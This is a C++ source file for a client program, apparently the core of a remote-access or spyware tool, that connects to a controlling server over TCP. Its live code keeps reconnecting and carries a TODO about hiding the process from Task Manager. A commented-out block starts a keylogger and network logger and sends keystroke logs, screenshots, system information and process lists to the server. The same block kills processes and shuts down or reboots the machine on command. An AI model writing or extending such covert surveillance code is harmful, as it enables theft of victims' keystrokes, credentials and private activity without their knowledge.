#include "ClientNetwork.hpp"
#include "App.hpp"
#include "CloseHandler.hpp"
#include <thread>


namespace Distance
{

    ClientApp& ClientApp::getInstance()
    {
        static ClientApp app;
        return app;
    }



    void ClientApp::run()
    {
        auto settings = std::make_unique<Network::ClientSetting>();
        Network::Configurator::invoke().loadSettings(settings.get());
        
        ModulesManager::invoke().addModules(CreateModules());
        ModulesManager::invoke().runAll();

        Network::Message msg;
        auto client = std::make_shared<Network::DefaultTcpClient>(std::move(settings));

        auto isRunClient = std::make_shared<bool>(true);
        // TODO: add hook for TerminateProcess or hide process for the Task manager
        std::thread closeHandlerThread(CloseHandler, client, isRunClient);

        while (*isRunClient)
        {
			client->reset();
			client->setHandler(Network::Handler::Connect, msg);
            client->run();
        }

        closeHandlerThread.join();
        /*
        KeyloggerControl keylogger;
        try
        {
            keylogger.start();
        }
        catch (const xstar::WinAPIException& err)
        {
            LOG_INFO("Keylogger error: ", err.what())
            return;
        }

        std::unique_ptr<NetfilterControl> netfilter;
        try
        {
            netfilter.reset(new NetfilterControl(NETFILTER_LOGFILE_NAME));
        }
        catch (const xstar::WinAPIException& err)
        {
            LOG_INFO("Netfilter error: ", err.what())
            return;
        }

        try
        {
            xstar::SmartHandle logfile = CreateFileA(
                g_KeyloggerPathToLogFile,
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                0,
                nullptr
            );
            if (logfile.getHandle() == INVALID_HANDLE_VALUE)
            {
                throw xstar::WinAPIException();
            }

            Query query;
            mainBuffer_ = std::make_unique<wchar_t []>(MainBufferSize / sizeof(wchar_t));

            client_.reset(new TcpSyncClient(ioContext_));
            client_->acceptQuery();
            while (true)
            {
                try
                {
                    client_->readQuery(&query);
                }
                catch (const std::exception&)
                {
                    client_.reset(new TcpSyncClient(ioContext_));
                    client_->acceptQuery();
                    continue;
                }

                switch (query)
                {
                case Query::GetInfoPC:
                {
                    ComputerInfo info;
                    info.updateInfo();

                    std::string infoBuf = info.packJson();
                    client_->dataSend(infoBuf);
                    break;
                }

                case Query::GetKeyLog:
                {
                    ZeroMemory(mainBuffer_.get(), MainBufferSize);
                    DWORD bytes;

                    BOOL isSuccess =
                    ReadFile(
                        logfile.getHandle(),
                        mainBuffer_.get(),
                        MainBufferSize,
                        &bytes,
                        nullptr
                    );
                    if (!isSuccess)
                        Logger::invoke()->writeln("Failed to read keylogger log file...");

                    mainBuffer_.get()[bytes ? bytes - 1 : 0] = L'\0';
                    client_->dataSend(mainBuffer_.get(), MainBufferSize / sizeof(wchar_t));
                    break;
                }

                case Query::GetProcessInfo:
                {
                    auto jsonList = ProcessListPackToJson(ProcessManager::update());
                    client_->dataSend(jsonList);
                    break;
                }

                case Query::TerminateProcess:
                {
                    uint32_t id = 0;
                    client_->dataReceive(&id, sizeof(uint32_t));
                    ProcessManager::terminate(id);
                    break;
                }

                case Query::GetScreenshot:
                {
                    std::string screenshot = CreateScreenshot();
                    client_->dataSend(screenshot);
                    break;
                }

                case Query::ShutdownPC:
                    PowerManager::shutdown();
                    break;
                case Query::LogoutPC:
                    PowerManager::logout();
                    break;
                case Query::RebootPC:
                    PowerManager::reboot();
                    break;

                case Query::GetNetLog:
                {
                    client_->dataSend(netfilter->getInfo(), PAGE_SIZE);
                    break;
                }
                default:
                    break;
                }
            }
        }
        catch (const std::exception& error)
        {
            Logger::invoke()->writeln(error.what());
        }
        */
    }

} // namespace Distance
